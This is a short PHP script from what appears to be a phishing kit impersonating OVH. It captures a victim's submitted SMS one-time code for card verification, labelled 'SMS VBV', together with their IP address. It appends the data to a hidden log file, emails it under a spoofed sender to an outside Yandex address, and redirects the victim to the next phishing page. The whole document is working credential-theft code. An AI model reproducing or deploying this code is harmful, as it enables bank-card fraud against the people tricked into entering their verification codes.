<?php
$var3=$_SERVER['QUERY_STRING'];
$var1="page=";
   $var2="";
   $ur=str_replace($var1,$var2,$var3, $count);
   if(isset($_GET['page'])){
    $pg=$_GET['page'];
   }ELSE{
    $pg='';
   }
$pg=$_REQUEST['page'];
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index3.php?page=$pg" ;
$hostname = gethostbyaddr($ip);
$message .= "************ SMS Bss7A ***********\n";
$message .= "SMS     : ".$_POST['s6']."\n";
$message .= "************ Linkin ***********\n";
$send = "rzl88@yandex.com";
@fclose(@fwrite(@fopen("../loqsqsf22222222.txt", "a"), $message."\r\n"));
$subject = "OVH | New SMS VBV  [$ip] ***";
$headers = "From: Sriyfa<config@serverstrato.net>";
mail($send,$subject,$message,$headers);
header("Location: $back");


?>